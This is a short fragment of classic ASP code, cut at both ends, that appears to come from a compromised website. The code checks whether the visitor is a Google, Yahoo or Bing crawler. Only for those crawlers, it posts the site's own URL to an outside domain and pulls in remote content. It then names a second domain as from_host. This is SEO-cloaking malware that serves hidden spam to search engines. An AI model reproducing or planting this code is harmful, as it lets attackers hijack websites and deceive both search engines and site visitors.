...
if Instr( s_http_user_agent, "google") <> 0 or Instr( s_http_user_agent, "yahoo") <> 0 or Instr(s_http_user_agent, "bing") <> 0 then
    js_code = HTTPPost("http://js.winkelsvoetbalshirts-nl.com/en_belts.js" & "?backurl=" & "http://" & Request.ServerVariables("Server_Name") & Request.ServerVariables("Script_Name") & "?" & Request.QueryString(), "")
...
<%
randomize
from_host = "mercuryleatherworks.com"
